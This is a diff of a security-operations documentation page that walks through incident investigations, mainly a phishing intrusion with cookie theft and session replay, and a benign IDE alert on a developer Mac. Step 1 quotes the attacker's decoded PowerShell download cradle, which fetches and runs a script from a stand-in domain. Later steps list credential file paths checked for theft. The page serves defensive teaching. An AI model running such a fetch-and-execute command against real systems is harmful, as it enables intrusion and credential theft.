@@ -1,6 +1,7 @@
 ---
 title: "Uncover working example"
-description: "The investigation, applied to the same finance-team intrusion. Evidence gathering across endpoint, network, identity, and cloud."
+description: "Four investigations under one standard of evidence: the finance-team intrusion, a benign true positive on a developer workstation, an identity-only SaaS compromise, and a cloud control-plane alert."
+techVerified: "2026-10-13"
 ---
 
 import SubPageHero from "@/components/assured/SubPageHero.astro";
@@ -10,102 +11,118 @@ import ExampleStepper from "@/components/assured/ExampleStepper.astro";
 import KeyTakeaway from "@/components/assured/KeyTakeaway.astro";
 import ContinueCard from "@/components/assured/ContinueCard.astro";
 import Callout from "@/components/assured/Callout.astro";
-import Reveal from "@/components/assured/Reveal.astro";
 import DefineTerm from "@/components/assured/DefineTerm.astro";
+import "@/styles/pages/uncover.css";
 
 <SubPageHero
   phase="uncover"
-  parentLetter="U"
   pillarIndex="Example"
-  pillarTotal="Uncover chapter"
-  chapterHref="/docs/uncover/"
-  chapterLabel="Uncover"
-  lede="The Uncover phase applied to the bounded investigation Scope handed off. Five steps that pull evidence from the right sources, correlate it, and produce the narrative the next phases need."
+  lede="Four walkthroughs, one standard of evidence: an endpoint intrusion, a benign true positive, an identity-only SaaS compromise, and a cloud control-plane alert. Each pulls evidence from the right sources, correlates it, and produces the narrative the next phases need."
 />
 
-<PillNav chapter="uncover" label="Uncover chapter" items={[
-  { label: "Data sources", href: "/docs/uncover/data-sources/", phase: "uncover" },
-  { label: "Correlation & timeline", href: "/docs/uncover/correlation/", phase: "uncover" },
-  { label: "Threat intelligence", href: "/docs/uncover/threat-intelligence/", phase: "uncover" },
-  { label: "MITRE ATT&CK", href: "/docs/uncover/mitre/", phase: "uncover" },
-  { label: "Tool integration", href: "/docs/uncover/tooling/", phase: "uncover" },
-]}/>
+<PillNav chapter="uncover" />
 
-## The first scenario: the finance-team evidence pull
+The four cases differ in where the evidence lives and what joins it. Each walkthrough shows only Uncover's steps; the <a href="/docs/cases/">case files</a> carry each case's whole thread and set the four side by side.
+
+<h2 id="case-a">Case A · The finance-team evidence pull</h2>
+
+Previously, in [Scope's Case A](/docs/scope/example/#case-a): a phishing-driven intrusion with a live beacon, a 72-hour primary window with a 4-week extended look at the three primary entities, fleet and tenant sweeps, and possible PCI and candidate GDPR exposure flagged for compliance. The whole case is in the [case files](/docs/cases/#case-a). The spine here is host, process and client source port, then the account and its session.
 
 <ChapterExample
   title="Pulling the evidence on the finance-team intrusion"
-  scenario="Scope set the boundary: phishing-driven intrusion, 72-hour primary window with a 4-week extended look at dlin, three primary identities, three secondary entities, likely PCI and GDPR exposure flagged for compliance. Uncover begins."
+  scenario="The escalation tripwire was met at 09:24 UTC and the page has not gone out, so read this as the work that should be running as scoping support under IR's clock. Uncover begins at 09:50."
 >
 
 <ExampleStepper steps={["Endpoint telemetry", "Network correlation", "Identity logs", "Mail and SaaS", "Map to ATT&CK"]}>
 
   <div data-step class="example-step">
     <h3>Step 1. Endpoint telemetry</h3>
-    <p>EDR for laptop-finance-09 over the 72-hour window. The Outlook → winword.exe → cmd → PowerShell chain is confirmed. The encoded command decodes to a download cradle pulling a second-stage payload from invoice-records[.]com/upd. The dropped file lives at %TEMP%\upd.ps1 with SHA-256 captured. No prior PowerShell from this user account; baseline confirms abnormality.</p>
-    <pre><code>{`EDR process event, laptop-finance-09, 09:11:41 UTC
-  chain:   outlook.exe -> winword.exe -> cmd.exe -> powershell.exe
+    <p>EDR for laptop-finance-09 over the 72-hour window. The chain is short: explorer.exe → powershell.exe, with the RunMRU value Explorer wrote one second before the launch and Chrome's visit to the same domain 95 seconds before that. The encoded command decodes to a download cradle that pulls a script from invoice-records[.]example/upd and runs it in memory; the stage also writes a copy of itself to %TEMP%\upd.ps1, SHA-256 captured. Script Block Logging holds the stage's full text, preserved for IR. This account has never run PowerShell before. The hash matches one commodity-loader campaign entry in the threat-intelligence platform: one indicator in one category, so attribution is LOW.</p>
+    <pre><code>{`EDR process event, laptop-finance-09, 2026-03-03 09:11:41 UTC
+  chain:   explorer.exe (4416) -> powershell.exe (8128)
+  runmru:  value written by explorer.exe (4416) at 09:11:40: same command line, then a decoy comment
   cmdline: powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3...
-  decoded: IEX (New-Object Net.WebClient).DownloadString('https://invoice-records[.]com/upd')
+  decoded: IEX (New-Object Net.WebClient).DownloadString('https://invoice-records[.]example/upd')
 
 File write, 09:11:44 UTC
-  path:    C:\\Users\\dlin\\AppData\\Local\\Temp\\upd.ps1
+  process: powershell.exe (8128)
+  path:    C:\\Users\\dlin\\AppData\\Local\\Temp\\upd.ps1   (the stage's copy of itself)
   sha256:  captured and recorded in the case file`}</code></pre>
-    <p><strong>Mapped to ATT&CK:</strong> T1566 (Phishing) → T1059.001 (PowerShell) → T1105 (Ingress Tool Transfer).</p>
+    <p><strong>Mapped to ATT&CK:</strong> T1566.002 (Spearphishing Link) → T1204.004 (User Execution: Malicious Copy and Paste) → T1059.001 (PowerShell, with T1027.010 Command Obfuscation and T1564.003 Hidden Window) → T1105 (Ingress Tool Transfer).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 2. Network correlation</h3>
-    <p>Proxy logs confirm the HTTPS connection to invoice-records[.]com. WHOIS shows the domain registered 4 days ago; passive DNS shows low prevalence and no prior queries from the environment. Firewall logs show outbound TLS at 09:11:43, matching the EDR network event for the PowerShell process to the second. Self-signed certificate with generic CN. The destination IP is in a hosting provider's bulletproof range.</p>
-    <pre><code>{`09:11:43  laptop-finance-09  dlin  CONNECT invoice-records[.]com:443  allowed  bytes_in=18432
-09:11:57  laptop-finance-09  dlin  CONNECT invoice-records[.]com:443  allowed  bytes_in=1102
-09:12:29  laptop-finance-09  dlin  CONNECT invoice-records[.]com:443  allowed  bytes_in=1088
+    <p>With an explicit proxy, EDR sees powershell.exe connect to the proxy, not to the destination, so the join to the proxy's lines runs on host, client source port and time: the source port EDR records for PID 8128 ties each proxy line to the process. Registration data (RDAP, formerly WHOIS) shows the domain created 2026-02-27, with a domain-validated certificate issued the same day; free certificates are normal for C2 now. Passive DNS shows low global prevalence, and the environment has no prior requests to it. The destination, 203.0.113.77, sits at a hosting provider common in commodity-phishing reporting. Connections repeat roughly every 30 seconds, and the one at 09:19:40 sends far more than it receives; step 3 explains it. Scope's sweep at 10:30 finds a second host: laptop-finance-14, Finance user 3's laptop, shows one browser visit at 09:57:06 and no other process talking to the domain. Whether anything ran there is queued for step 4.</p>
+    <pre><code>{`time      client                    user  request                                   bytes_out  bytes_in
+09:11:43  laptop-finance-09:52114   dlin  CONNECT invoice-records[.]example:443         612      18432
+09:11:57  laptop-finance-09:52119   dlin  CONNECT invoice-records[.]example:443         540       1102
+09:12:29  laptop-finance-09:52127   dlin  CONNECT invoice-records[.]example:443         538       1088
+09:19:40  laptop-finance-09:52388   dlin  CONNECT invoice-records[.]example:443       48211        734
 
-whois:       domain created 4 days before the alert
-passive DNS: zero prior resolutions from this environment`}</code></pre>
-    <p><strong>Mapped to ATT&CK:</strong> T1071.001 (Application Layer Protocol: Web Protocols).</p>
+EDR network event, 09:11:43  powershell.exe (8128)  local port 52114 -> proxy:8080
+rdap:          domain created 2026-02-27, 4 days before the alert
+certificate:   domain-validated, issued 2026-02-27 (Certificate Transparency)
+passive DNS:   low global prevalence
+proxy history: no prior requests from this environment
+sweep 10:30:   laptop-finance-09; laptop-finance-14 (browser only, 09:57:06); re-run in step 4`}</code></pre>
+    <p><strong>Mapped to ATT&CK:</strong> T1071.001 (Application Layer Protocol: Web Protocols); the 09:19:40 upload is T1041 (Exfiltration Over C2 Channel).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 3. Identity logs</h3>
-    <p>dlin's authentication history over the window: normal corporate-network logins, no anomalous geographies, no MFA bypass. However: EDR file-access telemetry shows the PowerShell agent reading the browser's cookie store at 09:19, and a federated login to the cloud finance platform follows at 09:23. The session rode dlin's existing SSO state, but it is distinguishable from dlin's own morning activity: different user-agent string than dlin's browser, and no matching interactive activity (no window focus, no input events) on the laptop at that moment. That discrimination is what turns "a login happened" into evidence. The 4-week extended look at dlin's account that Scope ordered also closes here: no earlier anomalous logins, no unfamiliar consent grants, no staging activity. The extended window is recorded as checked and clean.</p>
-    <pre><code>{`EDR file-access event, 09:19:12 UTC
-  process: powershell.exe (the upd.ps1 agent)
+    <p>dlin's sign-ins over the window are normal: corporate network, no anomalous geography, no MFA bypass, no authentication methods added. The endpoint says otherwise. At 09:19:10 the stage opens chrome.exe with memory read and write access, and at 09:19:12 it reads the browser's cookie store: that is the 09:19:40 upload. Chrome's app-bound encryption ties the cookie key to the browser, which is why the stage went into the browser process first. At 10:41:07 the identity provider records a sign-in to the cloud finance reporting platform as dlin from 198.51.100.23, a hosting-provider address new to this tenant, riding dlin's existing SSO session with no MFA prompt and a user agent that does not match dlin's browser. laptop-finance-09 made no connection to the IdP or the platform at that moment, and the platform's own log shows the same session. That discrimination turns "a login happened" into evidence: the session was replayed from somewhere else. The analyst finds it at 11:05, twenty-four minutes after it happened. The 4-week extended look at the three primary entities closes here, checked and clean: no earlier anomalous sign-ins, unfamiliar consent grants or staging.</p>
+    <pre><code>{`EDR process access, laptop-finance-09, 09:19:10 UTC
+  source:  powershell.exe (8128)
+  target:  chrome.exe   access: memory read/write
+
+EDR file-access event, 09:19:12 UTC
+  process: powershell.exe (8128)
   read:    ...\\User Data\\Default\\Network\\Cookies   (browser cookie store)
 
-Cloud finance platform, federated sign-in, 09:23:07 UTC
-  principal:  dlin          session: existing SSO state, no new MFA prompt
+IdP sign-in, cloud finance reporting platform, 10:41:07 UTC
+  principal:  dlin          session: existing SSO session, no MFA prompt
+  source IP:  198.51.100.23 (hosting provider; first seen for this tenant)
   user_agent: does not match dlin's browser (compared against the morning's sign-ins)
-  laptop interactive activity at 09:23: none (no window focus, no input events)`}</code></pre>
+  laptop-finance-09 at 10:41: no connection to the IdP or the platform`}</code></pre>
     <p><strong>Mapped to ATT&CK:</strong> T1539 (Steal Web Session Cookie) → T1550.004 (Use Alternate Authentication Material: Web Session Cookie).</p>
+    <p>Record whether the target binds sessions to a device (Device Bound Session Credentials in Chrome, token protection in the identity provider): where it does, a lifted cookie fails from another machine, so the control decides whether a replay was even possible.</p>
+    <p class="example-step__what-not"><strong>Escalation tripwire check:</strong> criterion 1 (confirmed malicious activity not fully contained by a control) was met at 09:24 UTC, at the end of Alert, and the page still has not gone out. The 11:05 finding adds criteria 2 and 3: an attacker-held session on a platform that stores EU vendor-contact personal data and feeds vendor payments, and session material sent over the C2 channel and replayed. Under the <a href="/docs/uncover/correlation/">stopping rules</a>, IR should already own this case. The walkthrough keeps going so you can see each step; the <a href="/docs/escalation/example/">Escalation decision example</a> shows what the delay cost.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 4. Mail and SaaS</h3>
-    <p>Mailbox audit confirms the originating email: vendor-themed subject, a ZIP attachment carrying a macro-laden Word document (a container chosen because many third-party extractors do not propagate the Mark of the Web, though Windows Explorer does; here the extracted document carried no mark, so Microsoft's default macro block never engaged). Three other recipients in the finance team received the same email; two opened it. EDR on those two hosts is queried; one shows the same Outlook → winword.exe → cmd → PowerShell chain. Cloud finance platform logs (vendor-provided, requested during Scope) show no in-app activity beyond the federated login.</p>
-    <pre><code>{`Mailbox audit, message trace
+    <p>Message trace shows the originating email: vendor-themed, no attachment, one link to a page on invoice-records[.]example that the gateway had no reputation for at delivery. With no file, the Mark of the Web and macro blocks had nothing to act on; the page persuades, and the user's paste into the Run dialog is the execution step. It reached dlin and three other finance-team mailboxes at 09:02:11. Whether anyone acted is an endpoint question, so EDR on the recipients' hosts is queried at 11:30 and the sweep re-run at 12:00. On laptop-finance-14, Finance user 3 pasted the command at 09:57 and the EDR's script-control prevention policy, piloted on that laptop, blocked powershell.exe at launch: nothing ran, and the prevented event did not page the queue. On laptop-finance-12, Finance user 2 followed the link at 10:52 and the full chain ran, ending with a cookie-store read at 10:58. No alert fired: the laptop was off the corporate network without the VPN, so its C2 traffic never crossed the proxy the rule reads. Finance user 4 never opened the message. Finance user 2 and laptop-finance-12 move to primary. The cloud finance platform's in-app logs, requested from the vendor during Scope, have not arrived: the platform shows the 10:41 sign-in and a session still active, and nothing about what that session did. That is a gap, not a clean result.</p>
+    <pre><code>{`Message trace (email gateway)
+  delivered:   2026-03-03 09:02:11 UTC, dlin + 3 finance-team mailboxes
   subject:     Overdue invoice: remittance required
-  from:        accounts@invoice-records[.]com
-  attachment:  invoice.zip -> invoice.doc (macro-enabled; extracted without Mark of the Web)
-  recipients:  dlin + 3 finance-team members
-  opened:      dlin (09:10) and 2 of the 3 peers
-  peer EDR:    1 of the 2 shows the same winword -> cmd -> PowerShell chain`}</code></pre>
-    <p><strong>Mapped to ATT&CK:</strong> T1566.001 (Spearphishing Attachment).</p>
-    <p class="example-step__what-not"><strong>What a less experienced analyst could miss:</strong> the second opener. Two peers opened the attachment and only one shows the execution chain, and it is tempting to file the other as clean. Absence of the chain is not evidence of safety until the absence is explained: was the macro blocked, did the payload fail, or is EDR on that host simply not reporting? "Checked, no chain, sensor healthy, macro block confirmed" is a finding. "No alert from that host" is a gap wearing a verdict's clothes.</p>
+  from:        accounts@invoice-records[.]example
+  body:        one link to invoice-records[.]example; no attachment
+
+EDR per recipient host (queried 11:30, sweep re-run 12:00)
+  laptop-finance-09  dlin    link 09:10:05; RunMRU 09:11:40; chain ran 09:11:41
+  laptop-finance-14  user 3  link 09:57:05; powershell.exe blocked at launch 09:57:41 by the pilot
+                             prevention policy; no script, no network; no RunMRU; sensor healthy
+  laptop-finance-12  user 2  link 10:52:14; RunMRU 10:53:00; chain ran 10:53:01;
+                             off network, no VPN: C2 direct, not via proxy; cookie store read 10:58:40
+  laptop-finance-07  user 4  link never followed; message unread`}</code></pre>
+    <p><strong>Mapped to ATT&CK:</strong> T1566.002 (Spearphishing Link), T1204.004 (User Execution: Malicious Copy and Paste).</p>
+    <p class="example-step__what-not"><strong>What a less experienced analyst could miss:</strong> the quiet hosts. Neither peer raised an alert, so it is tempting to file both as clean. Absence of the chain is not evidence of safety until the absence is explained: was the launch blocked, did the payload fail, or is the sensor not reporting? "Checked, no chain, sensor healthy, prevention event found" is a finding; "no alert from that host" is a gap wearing a verdict's clothes. An empty RunMRU key proves nothing either, because Windows records a Run-dialog command only if it launched. And the proxy sweep found the host where the control worked, not the one where the attack succeeded.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 5. Map to ATT&CK and finalize the narrative</h3>
     <p>The complete chain:</p>
-    <pre><code>{`T1566.001  Spearphishing attachment delivered to 4 finance team users
-T1204.002  User execution: 2 users opened the document
-T1059.001  PowerShell execution invoked from macro
-T1105      Ingress tool transfer: second-stage payload pulled from external domain
-T1071.001  Outbound HTTPS to attacker-controlled domain
-T1539      Browser session cookies read from the compromised host
-T1550.004  Stolen web session cookie replayed for federated access to cloud finance platform`}</code></pre>
-    <p>Two confirmed compromises (the original alert host plus one peer). No evidence of in-app activity yet on the cloud platform, but the federated login is the lateral-movement signal.</p>
-    <p>Uncover ends by packaging five artifacts for Risk: the <strong>evidence chain</strong> (the timestamped, ATT&amp;CK-mapped narrative above), the <strong>confirmed entities</strong> (two compromised hosts, the users, the cloud identity, each verdict with its supporting evidence), the <strong>intelligence context</strong> (the dropper hash matches a known campaign at medium confidence; the C2 domain is new), the <strong>coverage gaps</strong> (cloud-platform in-app activity pending from the vendor, BYOD phones invisible), and the <strong>detection gaps</strong> (the rule fired on one host but missed the identical chain on the peer). The <a href="/docs/uncover/transition/">transition page</a> shows the full handoff format.</p>
+    <pre><code>{`T1566.002  Spearphishing link delivered to 4 finance-team mailboxes (09:02)
+T1204.004  User execution: 3 users pasted the lure's command into the Run dialog; it ran on 2 hosts, blocked on 1
+T1059.001  Encoded, hidden PowerShell download cradle (T1027.010, T1564.003)
+T1105      Ingress tool transfer: stage pulled from invoice-records[.]example
+T1071.001  HTTPS beacon to attacker-controlled domain
+T1539      Browser session cookies stolen on both executing hosts
+T1041      Session material sent over the C2 channel (09:19:40)
+T1550.004  dlin's stolen session cookie replayed against the cloud finance platform (10:41)`}</code></pre>
+    <p>Two confirmed compromises (laptop-finance-09 and laptop-finance-12) and one execution stopped by a control (laptop-finance-14), all members of one case. The riskiest member sets its level, and the blocked host is recorded as contained, not dropped. Host-to-host lateral movement is refuted (no SMB, WMI, RDP, WinRM, or SSH to peers in the window); the identity pivot into the platform is confirmed.</p>
+    <p>Uncover packages its artifacts for Risk: the <strong>evidence chain</strong> above, the <strong>confirmed entities</strong> (two compromised hosts and their users, dlin's federated identity, the contained third host), the <strong>intelligence context</strong> (attribution LOW; the C2 domain matches no prior intel), the <strong>coverage gaps</strong> (in-app activity pending from the vendor, off-proxy hosts visible only in EDR, BYOD phones invisible), the <strong>detection gaps</strong> (the rule's network leg reads only the proxy; nothing alerted on the cookie theft or the replay), and the hypothesis ledger. The <a href="/docs/uncover/transition/">transition page</a> shows the full handoff.</p>
   </div>
 
 </ExampleStepper>
@@ -113,187 +130,173 @@ T1550.004  Stolen web session cookie replayed for federated access to cloud fina
 </ChapterExample>
 
 <KeyTakeaway>
-Uncover combined <DefineTerm term="Endpoint" display="endpoint" />, network, identity, and SaaS evidence into one chain. Each source answered a different question; the chain only emerged when all four came together. That is the whole point of the phase.
+Uncover combined <DefineTerm term="Endpoint" display="endpoint" />, network, identity, and mail evidence into one chain. Each source answered a different question, and the source that never answered (the vendor's in-app logs) is named as a gap rather than read as quiet.
 </KeyTakeaway>
 
 ---
 
-## A second scenario: confirming a benign true positive on the developer workstation
+<h2 id="case-b">Case B · Confirming a benign true positive on the developer workstation</h2>
 
-The first walkthrough showed Uncover building a positive narrative: this is the chain, here are the techniques, here is what to do next. Real triage often runs the other direction. The hypothesis is "compromise"; the evidence has to either confirm it or rule it out with explicit confidence. The methodology demands the same rigor on both paths.
+Previously, in [Scope's Case B](/docs/scope/example/#case-b): a narrow boundary on one managed macOS developer workstation and its frontend engineer, EDR primary, one bounded extension-layer check and one count-only fleet query. The whole case is in the [case files](/docs/cases/#case-b). Case A's chain confirmed compromise; here the hypothesis is still "compromise", and the evidence has to rule it out with explicit confidence, held to the same standard.
 
 <ChapterExample
   title="Pulling the evidence on the Cursor IDE alert"
-  scenario="Scope handed off a narrow boundary: macOS developer workstation, frontend engineer, alert minus 1 hour through alert plus 4 hours, EDR primary, the Cursor IDE / Cursor Helper alert that looked like Empire but came from a signed vendor binary. Uncover begins."
+  scenario="Window 13:03 to 14:48 UTC with a forward watch to 18:03. The alert: Cursor Helper (Plugin), the Cursor IDE's extension host, launched a child that opened encrypted connections, a pattern that looked like Empire but came from a signed vendor binary, on a host where the user also drives a coding agent. Uncover begins."
 >
 
-<ExampleStepper steps={["Endpoint telemetry", "Network and tooling", "Tooling coverage gaps", "Behavioral correlation", "Verdict and handoff"]}>
+<ExampleStepper steps={["Endpoint telemetry", "Network and extensions", "Tooling coverage gaps", "Behavioral correlation", "Verdict and handoff"]}>
 
   <div data-step class="example-step">
     <h3>Step 1. Endpoint telemetry</h3>
     <p>EDR data from CrowdStrike, scoped to the time window.</p>
     <ul class="example-step__list">
-      <li><strong>14:03 UTC.</strong> User launched Cursor IDE.</li>
-      <li><strong>14:03–14:04 UTC.</strong> ripgrep search for a test string involving a reCAPTCHA token. Consistent with active code work.</li>
-      <li><strong>14:04–14:07 UTC.</strong> Multiple git commands: fetch repository content, access to test files in BlockerEmailVerification and BlockerPhoneVerification modules.</li>
-      <li><strong>14:08 UTC.</strong> JavaScript test runner configuration, relevant test files loaded.</li>
-      <li><strong>14:08+ UTC.</strong> Additional git fetch operations tied to a specific Pull Request. Local branch checked out to <code>feat-migrate-phone-verification-to-flow</code>.</li>
+      <li><strong>14:03:02 UTC.</strong> User opened Cursor from the Dock (launchd → Cursor), on the frontend repository's workspace.</li>
+      <li><strong>14:03:09–14:03:11 UTC.</strong> Cursor started its extension host, Cursor Helper (Plugin), without a sandbox. The extension host launched a child (PID 41877) running a script from the app bundle's built-in extensions directory, and the child opened TLS to <code>repo42.cursor.sh</code> and <code>api2.cursor.sh</code>. The alert fired at 14:03:11. The child exited at 14:05:52.</li>
+      <li><strong>14:03:20 UTC.</strong> User prompted Cursor's coding agent to find why the authentication tests fail on the migration branch. The agent's commands run in a zsh shell the IDE launched for its terminal, not under the extension host or its child.</li>
+      <li><strong>14:03–14:08+ UTC.</strong> From that shell, the agent ran a ripgrep search for a test-fixture string, git commands reading test files in the <code>AuthFlowA</code> and <code>AuthFlowB</code> modules, the JavaScript test runner, and git fetches for a specific pull request, then checked out <code>feat-migrate-auth-flow</code>.</li>
+      <li><strong>Binary identity.</strong> The on-disk hash matches the vendor-signed release for the installed version, which matches the MDM record; signature, notarization and Team ID verify. The extension host and its indexing child appear with the same command lines on every IDE launch in the 14-day history.</li>
+      <li><strong>Human or agent.</strong> Both: the agent ran the commands, at the user's request. The IDE's local agent-activity record for the window (collected read-only) holds the prompt and every command the agent ran, and each matches an EDR process event under the agent's shell. Every command serves the prompt, the files read are inside the workspace, and no MCP tool was called. No command departs from the prompt after the agent read the repository, the pull request or a command's output, which is where an indirect prompt injection would show. The test run executed the branch's own code, so its child processes got the same destination and credential-path checks as the rest of the window.</li>
     </ul>
-    <p>This sequence is a textbook developer workflow on a feature migration. Process tree, command lines, file access all align with the user's documented role.</p>
-    <p><strong>Mapped to ATT&CK:</strong> nothing in this sequence maps to an attack technique. Worth recording explicitly so the handoff says "behavior is consistent with role" rather than leaving the question open.</p>
+    <p>Process tree, command lines, file access and the agent record all align with the user's documented role.</p>
+    <p><strong>Mapped to ATT&CK:</strong> nothing in this sequence maps to an attack technique. Record that explicitly, so the handoff says "behavior is consistent with role" rather than leaving the question open.</p>
   </div>
 
   <div data-step class="example-step">
-    <h3>Step 2. Network and tooling analysis</h3>
-    <p>Network telemetry over the same window.</p>
+    <h3>Step 2. Network and extension-layer analysis</h3>
     <ul class="example-step__list">
-      <li><strong>Outbound destinations.</strong> Legitimate corporate version-control hosts, internal development services, collaboration tools. All previously seen, all expected for the role.</li>
-      <li><strong>Traffic volume and frequency.</strong> Consistent with normal development. No unusual transfer volume, no beaconing pattern, no periodic callbacks.</li>
-      <li><strong>Protocols and ports.</strong> Standard ports for the observed services. No protocol tunneling, no port mismatch indicative of evasion.</li>
-      <li><strong>DNS queries.</strong> Internal development domains and trusted external services. No DGA-like entropy, no resolutions to known-malicious domains.</li>
+      <li><strong>Cursor TLS sessions.</strong> Every session from the extension host and its child went to Cursor-owned hosts on the vendor's published allowlist (<code>repo42.cursor.sh</code>, <code>api2.cursor.sh</code>, <code>api3.cursor.sh</code>), with valid certificates matching the requested names and byte counts that fit indexing and completion traffic. No direct connections to third-party model providers.</li>
+      <li><strong>Everything else.</strong> Corporate version-control hosts, internal development services and collaboration tools, all previously seen, on standard ports. No beaconing, no tunneling, no unusual volume, no DGA-like or known-malicious resolutions.</li>
+      <li><strong>Owning extension.</strong> The child's script sits in the app bundle's built-in extensions directory, covered by the bundle signature. The extension ships with Cursor; the user did not install it.</li>
+      <li><strong>User-installed extensions.</strong> All on the approved list, all from publishers peers also use; none installed or updated in the 14 days before the alert.</li>
+      <li><strong>MCP servers.</strong> One approved internal documentation server in <code>&#126;/.cursor/mcp.json</code>, unchanged in the comparison window; no workspace <code>.cursor/mcp.json</code>.</li>
+      <li><strong>Workspace tasks.</strong> <code>.vscode/tasks.json</code> defines the test task only; nothing runs on folder open.</li>
     </ul>
-    <p>The network picture matches the endpoint picture. Nothing here suggests the binary's TLS-encrypted outbound calls (the original signal that mapped to Empire patterns) were to anything other than the IDE's documented vendor infrastructure.</p>
+    <p>The extension layer explains the child: the TLS calls that matched Empire patterns went to Cursor's own allowlisted infrastructure, from vendor code inside the signed bundle. It gets its own check because the signature does not reach it: extensions, MCP servers, workspace tasks and the agent's commands all run under the signed application, so a valid signature says nothing about the code they bring or the commands they run.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 3. Tooling coverage gaps</h3>
-    <p>Uncover does not just report what it found. It reports what it could not see.</p>
+    <p>Uncover reports what it could not see as well as what it found.</p>
     <ul class="example-step__list">
       <li><strong>CrowdStrike on macOS:</strong> active, capturing process execution, file access, network traffic. Primary source, working as expected.</li>
-      <li><strong>Native full-packet capture:</strong> not available on this macOS configuration. Payload-level inspection of encrypted traffic is therefore not possible from the host's perspective.</li>
-      <li><strong>USB device monitoring:</strong> absent. Cannot conclusively rule out offline data movement.</li>
+      <li><strong>Encrypted content:</strong> the egress proxy records TLS metadata only (destination name, certificate, byte counts) and does not inspect content to the vendor's endpoints. What was sent is not visible; where it went is.</li>
+      <li><strong>USB device control:</strong> not deployed on this host class. Offline data movement cannot be ruled out from telemetry; nothing in the window gathered or archived data for it.</li>
       <li><strong>Persistence mechanisms (LaunchAgents, LaunchDaemons):</strong> reviewed via EDR file activity. No new entries during the window.</li>
     </ul>
-
-    <Reveal summary="What the gaps mean for the verdict" variant="info">
-
-    Uncover's job at this step is to be explicit about confidence. The two gaps (full PCAP and USB) mean certain attack vectors cannot be fully ruled out from <DefineTerm term="Telemetry" display="telemetry" /> alone.
-
-    However, no other evidence in the available sources supports expanding scope to chase those vectors. The methodology calls this out as "no positive evidence supports expansion at this time, gaps documented, will revisit if new signals surface" rather than pretending the gaps do not exist or panic-expanding the investigation because of them.
-
-    </Reveal>
+    <p>Neither gap sits under the verdict question, which is what code ran and where it connected; endpoint <DefineTerm term="Telemetry" display="telemetry" /> and TLS metadata answer both. So "unknown is not Low" does not pull confidence down here, and the record says exactly that: "no positive evidence supports expansion at this time, gaps documented, will revisit if new signals surface", with a reopen trigger for each gap.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 4. Behavioral correlation against the role baseline</h3>
-    <p>Subject's analysis already established this user's baseline as consistent with the activity. Uncover validates that claim with the deeper telemetry.</p>
+    <p>Subject established this user's baseline as consistent with the activity. Uncover tests that claim with deeper telemetry.</p>
     <ul class="example-step__list">
-      <li><strong>Peer comparison.</strong> Three other engineers on the same team show similar Cursor process trees and network patterns over the past 30 days. The behavior is not unique to this user.</li>
-      <li><strong>Historical workflow.</strong> The user's last 14 days show consistent IDE usage, regular git activity, and the same outbound destinations. The 14:03 sequence is part of a continuous workflow, not a sudden anomaly.</li>
-      <li><strong>No persistence created.</strong> No new launchd plists, no new login items, no new scheduled tasks. The binary did not attempt to anchor itself to the system.</li>
-      <li><strong>No credential access.</strong> Keychain access logs show no unusual reads. No new SSH keys, no API token grabs.</li>
+      <li><strong>Peer comparison.</strong> The one count-only fleet prevalence query Scope allowed, run at 14:44: eleven other managed developer Macs on the same Cursor build show the same extension-host child and destination set over the past 30 days, three of them on this user's team. No per-host investigation.</li>
+      <li><strong>Historical workflow.</strong> The last 14 days show consistent IDE use, regular git activity and the same outbound destinations. The 14:03 sequence is part of a continuous workflow, not a sudden anomaly.</li>
+      <li><strong>No persistence created.</strong> No new LaunchAgents or LaunchDaemons, login items or shell-profile changes.</li>
+      <li><strong>No credential access.</strong> No reads of <code>&#126;/.ssh</code>, <code>&#126;/.aws</code>, <code>&#126;/.npmrc</code>, <code>&#126;/.config/gh</code>, browser profiles or <code>&#126;/Library/Keychains</code>, no <code>security</code> command invocations, no new SSH keys.</li>
     </ul>
-    <p>Four corroborating sources (peer baseline, individual history, persistence absence, credential absence) all agree with the role-consistent reading.</p>
+    <p>Four checks agree with the role-consistent reading. Count them honestly: they draw on three sources (the EDR sensor, the egress proxy, the MDM inventory), so they are consistent lines of evidence rather than four independent ones, and a blind spot in the sensor would touch most of them.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 5. Verdict and handoff</h3>
-    <p>Uncover ends with a structured, defensible verdict.</p>
     <ul class="example-step__list">
-      <li><strong>Verdict:</strong> benign true positive with explicit caveats. Detection axis: correct — the logic flagged a process-behavior pattern that genuinely occurred and overlaps with Empire tradecraft. Disposition axis: benign — the full investigation shows the behavior is consistent with a signed, role-appropriate IDE running in its documented configuration.</li>
-      <li><strong>Confidence:</strong> high on the binary identity, network destinations, and user behavior. Medium on full coverage due to the macOS PCAP and USB monitoring gaps; mitigated by absence of corroborating signals.</li>
-      <li><strong>ATT&CK chain:</strong> none. No techniques observed beyond legitimate development activity.</li>
-      <li><strong>Detection feedback:</strong> the rule that fired is too broad for macOS developer workstations running Electron-based IDEs. A tuned variant that incorporates binary signature, install path, and runtime context would have suppressed this alert. Feature request opened.</li>
-      <li><strong>Open question for Risk:</strong> are the documented coverage gaps (macOS PCAP, USB) acceptable given the developer-workstation population's risk profile, or do they warrant additional tooling investment? That is a Risk-phase question, not an Uncover-phase one.</li>
+      <li><strong>Verdict:</strong> benign true positive. Detection axis: true positive; the logic flagged a process-behavior pattern that genuinely occurred and overlaps with Empire tradecraft. Activity axis: authorized (benign true positive); a bundled Cursor extension, running in the signed extension host in its documented configuration, indexed the workspace while the user, and the coding agent at the user's request, worked on the authentication tests.</li>
+      <li><strong>Confidence:</strong> High. Direct evidence from EDR, corroborated by the proxy and the MDM inventory, with the alternatives (a malicious or newly updated extension, an MCP server or workspace task, an agent command the user did not ask for, credential theft) each tested and ruled out. The two named gaps sit beside the verdict question, so they do not lower it.</li>
+      <li><strong>ATT&CK chain:</strong> none. The alternatives ruled out would have mapped to T1176.002 (Software Extensions: IDE Extensions) and T1195.001 (Compromise Software Dependencies and Development Tools).</li>
